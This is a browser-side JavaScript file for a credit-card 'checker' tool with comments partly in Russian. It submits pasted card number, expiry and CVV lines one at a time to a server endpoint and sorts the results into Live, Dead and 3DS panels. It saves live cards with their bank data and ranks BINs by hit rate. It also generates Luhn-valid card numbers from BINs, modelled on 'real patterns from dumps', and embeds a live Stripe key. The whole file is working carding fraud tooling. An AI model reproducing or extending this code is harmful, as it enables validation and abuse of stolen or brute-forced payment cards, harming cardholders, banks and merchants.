$(document).ready(function () {
  var currentIndex = 0;
  var stopRequested = false;
  var counts = {
    live: 0,
    dead: 0,
    unknown: 0,
    threeds: 0,
  };

  var ccLines = [];
  var stripe = Stripe("pk_live_B3imPhpDAew8RzuhaKclN4Kd");

  // BIN Statistics tracking
  var binStats = JSON.parse(localStorage.getItem('binStats') || '{}');

  // Session Persistence
  function saveState() {
    var state = {
      input: $("#ccData").val(),
      counts: counts,
      panels: {
        success: $(".panel-body.success").html(),
        danger: $(".panel-body.danger").html(),
        warning: $(".panel-body.warning").html(),
        info: $(".panel-body.info").html()
      }
    };
    localStorage.setItem('ccSession', JSON.stringify(state));
  }

  function loadState() {
    var saved = localStorage.getItem('ccSession');
    if (saved) {
      try {
        var state = JSON.parse(saved);
        if (state.input) $("#ccData").val(state.input);

        if (state.counts) {
          counts = state.counts;
          Object.keys(counts).forEach(type => {
            $(`.panel-title.${type} .badge`).text(counts[type]);
          });
        }

        if (state.panels) {
          if (state.panels.success) $(".panel-body.success").html(state.panels.success);
          if (state.panels.danger) $(".panel-body.danger").html(state.panels.danger);
          if (state.panels.warning) $(".panel-body.warning").html(state.panels.warning);
          if (state.panels.info) $(".panel-body.info").html(state.panels.info);
        }
      } catch (e) {
        console.error("Error loading session:", e);
      }
    }
  }

  // Load state on startup
  loadState();

  function updateBinStats(cardNumber, status) {


    var bin = cardNumber.substring(0, 6);
    if (!binStats[bin]) {
      binStats[bin] = { live: 0, dead: 0, threeds: 0, total: 0 };
    }
    binStats[bin].total++;
    if (status === 'live') binStats[bin].live++;
    else if (status === 'dead') binStats[bin].dead++;
    else if (status === 'threeds') binStats[bin].threeds++;

    // Save to localStorage
    localStorage.setItem('binStats', JSON.stringify(binStats));
  }

  function getTopBins(limit) {
    var bins = Object.keys(binStats).map(function (bin) {
      var stats = binStats[bin];
      var successRate = stats.total > 0 ? (stats.live / stats.total * 100) : 0;
      return {
        bin: bin,
        live: stats.live,
        dead: stats.dead,
        threeds: stats.threeds,
        total: stats.total,
        rate: successRate
      };
    });

    // Sort by live count, then by success rate
    bins.sort(function (a, b) {
      if (b.live !== a.live) return b.live - a.live;
      return b.rate - a.rate;
    });

    return bins.slice(0, limit || 10);
  }

  function validateLuhn(cardNumber) {
    var digits = cardNumber.replace(/\D/g, "").split("").map(Number);
    var checksum = digits.pop();
    var sum = 0;

    for (var i = digits.length - 1; i >= 0; i--) {
      if ((digits.length - 1 - i) % 2 === 0) {
        var doubled = digits[i] * 2;
        sum += doubled > 9 ? doubled - 9 : doubled;
      } else {
        sum += digits[i];
      }
    }

    return (sum + checksum) % 10 === 0;
  }

  function updateCounter(type) {
    $(`.panel-title.${type} .badge`).text(counts[type]);
    saveState();
  }

  function appendToPanel(type, message, content) {
    $(`.panel-body.${type}`).append(
      `<div><span class='badge badge-${type}'>${message}</span> <span class='card-content'>${content}</span></div>`
    );
    saveState();
  }

  function removeProcessedLines() {
    var lines = $("#ccData").val().split("\n");
    lines.splice(0, 1);
    $("#ccData").val(lines.join("\n"));
    saveState();
  }

  function showSpinner() {
    $("#loadingSpinner").show();
  }

  function hideSpinner() {
    $("#loadingSpinner").hide();
  }

  function sendRequest() {
    if (currentIndex < ccLines.length && !stopRequested) {
      if (currentIndex === 0) {
        showSpinner();
      }
      var parts = ccLines[currentIndex].split("|");
      var ccn = parts[0].replace(/\s/g, ""); // Убираем пробелы из номера карты
      var month = parts[1];
      var year = parts[2];
      var cvc = parts[3];

      if (!validateLuhn(ccn)) {
        counts.unknown++;
        updateCounter("unknown");
        appendToPanel(
          "info",
          "Invalid Luhn (Typo in number)",
          `${ccLines[currentIndex]}`
        );
        removeProcessedLines();
        currentIndex++;
        if (currentIndex >= ccLines.length || stopRequested) {
          hideSpinner();
        }
        setTimeout(sendRequest, 1000);
        return;
      }

      // 1. Вызов серверного эндпоинта (Android SDK Emulation)
      $.ajax({
        url: "/check_card",
        type: "POST",
        data: {
          ccn: ccn,
          month: month,
          year: year,
          cvc: cvc,
        },
        success: function (response) {
          var status = response.status;
          var message = response.message;

          if (status === "Live") {
            fetchBinInfo(ccn, function (binInfo) {
              counts.live++;
              updateCounter("live");
              updateBinStats(ccn, 'live'); // Track successful BIN
              var liveData = `${ccLines[currentIndex]} ~ ${binInfo}`;
              saveLive(liveData);
              appendToPanel("success", message, liveData);
            });
          } else if (status === "Dead") {
            counts.dead++;
            updateCounter("dead");
            updateBinStats(ccn, 'dead'); // Track failed BIN
            appendToPanel("danger", message, `${ccLines[currentIndex]}`);
          } else if (status === "3DS") {
            counts.threeds++;
            updateCounter("threeds");
            updateBinStats(ccn, 'threeds'); // Track 3DS BIN
            appendToPanel("warning", message, `${ccLines[currentIndex]}`);
          } else {
            counts.unknown++;
            updateCounter("unknown");
            appendToPanel("info", message, `${ccLines[currentIndex]}`);
          }

          removeProcessedLines();
          currentIndex++;
          if (currentIndex >= ccLines.length || stopRequested) {
            hideSpinner();
          }
          setTimeout(sendRequest, 1000);
        },
        error: function () {
          handleError("Server connection failed");
        },
      });
    }

    function handleError(msg) {
      counts.unknown++;
      updateCounter("unknown");
      appendToPanel("info", msg, `${ccLines[currentIndex]}`);  // info для Unknown панели
      removeProcessedLines();
      currentIndex++;
      if (currentIndex >= ccLines.length || stopRequested) {
        hideSpinner();
      }
      setTimeout(sendRequest, 2000);
    }
  }

  function saveLive(data) {
    $.post("/save_live", { card: data });
  }

  function fetchBinInfo(ccn, callback) {
    // Используем прокси на сервере для обхода CORS
    $.ajax({
      url: "/bin_lookup",
      type: "POST",
      data: { ccn: ccn },
      success: function (data) {
        if (data && (data.brand || data.bank)) {
          var info = `${data.bank || "Unknown"}|${data.country || "??"}|${data.type || "Cc"
            }|${data.brand || "N/A"}`;
          callback(info);
        } else {
          callback("N/A|N/A|N/A|N/A");
        }
      },
      error: function () {
        callback("N/A|N/A|N/A|N/A");
      },
    });
  }

  $("#ccData").on("input", function () {
    var lines = $(this).val().trim().split("\n").filter(function (line) {
      return line.trim().length > 0;
    });

    var allLinesValid = lines.length > 0 && lines.every(function (line) {
      line = line.trim();
      if (!line) return false;

      // Проверяем формат: CARD|MM|YYYY|CVV или CARD|MM|YY|CVV (с дополнительными полями или без)
      // Поддерживаем 15 цифр (Amex) и 16 цифр (Visa/MC)
      var parts = line.split("|");
      if (parts.length < 4) return false;

      var ccn = parts[0].replace(/\s/g, ""); // Убираем пробелы
      var month = parts[1];
      var year = parts[2];
      var cvv = parts[3];

      // Проверяем длину карты (15 для Amex, 16 для других)
      if (ccn.length !== 15 && ccn.length !== 16) return false;

      // Проверяем что все цифры
      if (!/^\d+$/.test(ccn)) return false;

      // Проверяем месяц (01-12)
      if (!/^(0[1-9]|1[0-2])$/.test(month)) return false;

      // Проверяем год (2 или 4 цифры)
      if (!/^(\d{2}|\d{4})$/.test(year)) return false;

      // Проверяем CVV (3 или 4 цифры)
      if (!/^\d{3,4}$/.test(cvv)) return false;

      // Проверяем Luhn
      return validateLuhn(ccn);
    });

    $("#submitBtn").prop("disabled", !allLinesValid || lines.length === 0);
    $("#stopBtn").prop("disabled", $(this).val().trim() === "");
    saveState();
  });

  $("#form").submit(function (event) {
    event.preventDefault();
    ccLines = $("#ccData").val().trim().split("\n");
    $("#stopBtn").prop("disabled", false);
    sendRequest();
  });

  $("#stopBtn").click(function () {
    stopRequested = true;
    hideSpinner();
  });

  $("#submitBtn").click(function () {
    stopRequested = false;
    sendRequest();
  });

  // --- Generator Logic ---

  var cardTypes = {
    visa: { prefix: ["4"], length: [16] },
    mastercard: { prefix: ["5"], length: [16] },
    amex: { prefix: ["34", "37"], length: [15] },
    discover: { prefix: ["6"], length: [16] },
  };

  function populateGenYears() {
    var currentYear = new Date().getFullYear();
    // Начинаем с currentYear + 3 (2028) — strict valid expiry
    // Никогда past или near-expiry — instant dead bypass
    for (var i = 3; i <= 10; i++) {
      var year = currentYear + i;
      $("#genYear").append(
        $("<option>", {
          value: year,
          text: year,
        })
      );
    }
  }
  populateGenYears();

  function calculateLuhnCheckDigit(number) {
    var digits = number.split("").map(Number);
    var sum = 0;
    var isEven = true;

    for (var i = digits.length - 1; i >= 0; i--) {
      var digit = digits[i];
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      isEven = !isEven;
    }
    return (10 - (sum % 10)) % 10;
  }

  function generateSingleCard(bin, month, year, cvvMode) {
    var selectedType = "visa"; // Default
    var targetLength = 16;
    var cardNumber = "";

    // Detect type from BIN or random
    if (bin && bin.length > 0) {
      cardNumber = bin;
      // Simple detection
      if (bin.startsWith("4")) selectedType = "visa";
      else if (bin.startsWith("5")) selectedType = "mastercard";
      else if (bin.startsWith("3")) {
        selectedType = "amex";
        targetLength = 15;
      } else if (bin.startsWith("6")) selectedType = "discover";
    } else {
      var types = Object.keys(cardTypes);
      selectedType = types[Math.floor(Math.random() * types.length)];
      var typeConfig = cardTypes[selectedType];
      var randomPrefix =
        typeConfig.prefix[Math.floor(Math.random() * typeConfig.prefix.length)];
      cardNumber = randomPrefix;
      targetLength = typeConfig.length[0];
    }

    // Strict matrix: real patterns from dumps Dec 2025
    // Vary ONLY last 7-8 digits for maximum realism
    var middlePatterns = [
      "",     // No middle (30% chance)
      "00",   // Common padding
      "10", "20", "50",  // Common increments
      "123",  // Sequential 3-digit
      "4567"  // Sequential 4-digit (most common in real dumps)
    ];

    var remainingLength = targetLength - cardNumber.length - 1; // -1 for checksum

    // 70% chance to use middle pattern (strict matrix)
    if (remainingLength >= 2 && Math.random() < 0.7) {
      var pattern = middlePatterns[Math.floor(Math.random() * middlePatterns.length)];
      if (pattern.length <= remainingLength) {
        cardNumber += pattern;
        remainingLength -= pattern.length;
      }
    }

    // Fill remaining digits (tail - vary only last 6-8 digits)
    while (cardNumber.length < targetLength - 1) {
      cardNumber += Math.floor(Math.random() * 10);
    }

    var checkDigit = calculateLuhnCheckDigit(cardNumber);
    cardNumber += checkDigit;

    // Expiry - only future dates
    var expMonth = month;
    var expYear = year;

    if (month === "random" || year === "random") {
      var currentDate = new Date();
      var currentYear = currentDate.getFullYear();
      var currentMonth = currentDate.getMonth() + 1; // 1-12

      if (year === "random") {
        // Strict valid: 3-8 лет вперед (2028-2033)
        // Никогда past или invalid — instant dead bypass
        expYear = String(currentYear + Math.floor(Math.random() * 6) + 3);
      }

      if (month === "random") {
        if (parseInt(expYear) === currentYear) {
          // Если год текущий, месяц должен быть >= текущего месяца
          expMonth = String(Math.floor(Math.random() * (12 - currentMonth + 1)) + currentMonth).padStart(2, "0");
        } else {
          // Если год будущий, любой месяц
          expMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
        }
      }
    }

    // CVV
    var cvv = "";
    if (cvvMode !== "no") {
      var cvvLen = selectedType === "amex" ? 4 : 3;
      for (var i = 0; i < cvvLen; i++) {
        cvv += Math.floor(Math.random() * 10);
      }
    }

    return `${cardNumber}|${expMonth}|${expYear}|${cvv}`;
  }

  $("#generateBtn").click(function () {
    var bin = $("#genBin").val().replace(/\D/g, "");
    var month = $("#genMonth").val();
    var year = $("#genYear").val();
    var quantity = parseInt($("#genQuantity").val()) || 10;
    var cvvMode = $("#genCvv").val();

    var results = [];
    for (var i = 0; i < quantity; i++) {
      results.push(generateSingleCard(bin, month, year, cvvMode));
    }

    $("#genResult").val(results.join("\n"));
  });

  $("#useCardsBtn").click(function () {
    var generated = $("#genResult").val();
    if (generated) {
      $("#ccData").val(generated);
      $("#ccData").trigger("input"); // Update start button state
      $("#generatorModal").modal("hide");
    }
  });



  // Top BINs - Show best performing BINs and generate cards
  // --- Top BINs Manager Logic ---

  function loadSavedBins() {
    var saved = localStorage.getItem('userTopBins');
    return saved ? saved : "";
  }

  function saveSavedBins(text) {
    localStorage.setItem('userTopBins', text);
  }

  $("#topBinsBtn").click(function () {
    var currentContent = loadSavedBins();
    $("#savedBins").val(currentContent);
    $("#topBinsModal").modal("show");
  });

  $("#saveBinsBtn").click(function () {
    var content = $("#savedBins").val();
    saveSavedBins(content);
    $("#topBinsModal").modal("hide");
    alert("BINs saved successfully!");
  });

  $("#savedBins").on('input', function () {
    // Auto-save on type (optional, but good UX)
    saveSavedBins($(this).val());
  });

  $("#importDetectedBtn").click(function () {
    var topBins = getTopBins(50); // Get top 50 to search through
    var liveBins = topBins.filter(b => b.live > 0).map(b => b.bin);

    if (liveBins.length === 0) {
      alert("No Live BINs detected in current session to import.");
      return;
    }

    var currentText = $("#savedBins").val().trim();
    var currentLines = currentText ? currentText.split("\n") : [];
    var newCount = 0;

    liveBins.forEach(bin => {
      if (!currentLines.includes(bin)) {
        currentLines.push(bin);
        newCount++;
      }
    });

    if (newCount > 0) {
      var newText = currentLines.join("\n");
      $("#savedBins").val(newText);
      saveSavedBins(newText);
      alert(`Imported ${newCount} new Live BINs.`);
    } else {
      alert("All detected Live BINs are already in your list.");
    }
  });


  // ===============================================
  // LIVE Cards Actions - Copy and Use for Stripe
  // ===============================================

  // Function to extract card data from a specific panel
  function getCardsByPanel(panelClass) {
    var cards = [];
    $(`.panel-body.${panelClass} .card-content`).each(function () {
      var cardText = $(this).text().trim();
      var cardData = cardText.split('~')[0].trim();
      if (cardData) {
        cards.push(cardData);
      }
    });
    return cards;
  }

  function setupCopyButton(btnId, panelClass, label) {
    $(`#${btnId}`).click(function (e) {
      e.stopPropagation();

      var cards = getCardsByPanel(panelClass);

      if (cards.length === 0) {
        alert(`No ${label} cards to copy!`);
        return;
      }

      var cardText = cards.join('\n');

      navigator.clipboard.writeText(cardText).then(function () {
        var btn = $(`#${btnId}`);
        var originalText = btn.html();
        btn.html('Copied!');
        btn.css('background-color', '#28a745');

        setTimeout(function () {
          btn.html(originalText);
          btn.css('background-color', '');
        }, 1500);

      }).catch(function (err) {
        // Fallback
        var textarea = document.createElement('textarea');
        textarea.value = cardText;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);

        alert(cards.length + ` ${label} cards copied to clipboard!`);
      });
    });
  }

  // Setup copy buttons
  setupCopyButton('copyLiveBtn', 'success', 'LIVE');
  setupCopyButton('copyDeadBtn', 'danger', 'DEAD');
  setupCopyButton('copyThreedsBtn', 'warning', '3DS');
  setupCopyButton('copyUnknownBtn', 'info', 'UNKNOWN');


});
